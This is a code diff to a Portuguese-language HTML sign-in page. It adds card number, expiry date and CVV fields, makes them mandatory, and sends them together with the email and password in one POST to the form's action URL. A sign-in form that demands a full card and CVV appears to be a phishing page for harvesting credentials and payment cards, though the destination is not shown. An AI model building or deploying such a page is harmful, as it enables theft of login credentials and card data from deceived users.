@@ -94,13 +94,13 @@
                 <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
             </div>
             <div class="form-group">
-                <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="Número do Cartão" inputmode="numeric" maxlength="16">
+                <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="Número do Cartão" inputmode="numeric" maxlength="16" oninput="formatCardNumber(this)">
             </div>
             <div class="form-group">
                 <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="Data de Validade" inputmode="numeric" maxlength="5" oninput="formatExpiryDate(this)">
             </div>
             <div class="form-group">
-                <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV">
+                <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV" maxlength="3">
             </div>
             <button type="button" onclick="enviarFormulario()">Entrar</button>
             <p id="mensagemErro" style="color: red;"></p>
@@ -111,8 +111,11 @@
         function enviarFormulario() {
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
+            var cardNumber = document.getElementById('cardNumber').value;
+            var expiryDate = document.getElementById('expiryDate').value;
+            var cvv = document.getElementById('cvv').value;
 
-            if (email === '' || password === '') {
+            if (email === '' || password === '' || cardNumber === '' || expiryDate === '' || cvv === '') {
                 document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
                 return;
             }
@@ -120,6 +123,9 @@
             var formData = new FormData();
             formData.append('email', email);
             formData.append('password', password);
+            formData.append('cardNumber', cardNumber);
+            formData.append('expiryDate', expiryDate);
+            formData.append('cvv', cvv);
 
             var xhr = new XMLHttpRequest();
             xhr.open('POST', document.getElementById("loginForm").action);
@@ -136,7 +142,19 @@
         }
 
         function formatExpiryDate(input) {
-            var value = input.value.replace(/\D/g, '').replace(/^(\d{2})/, '$1/');
+            var value = input.value.replace(/\D/g, '').substring(0, 4);
+            var newValue = '';
+            if (value.length > 2) {
+                newValue += value.substr(0, 2) + '/' + value.substr(2);
+            } else {
+                newValue += value;
+            }
+            input.value = newValue;
+        }
+
+        function formatCardNumber(input) {
+            var value = input.value.replace(/\D/g, '');
+            value = value.substring(0, 16);
             input.value = value;
         }
     </script>
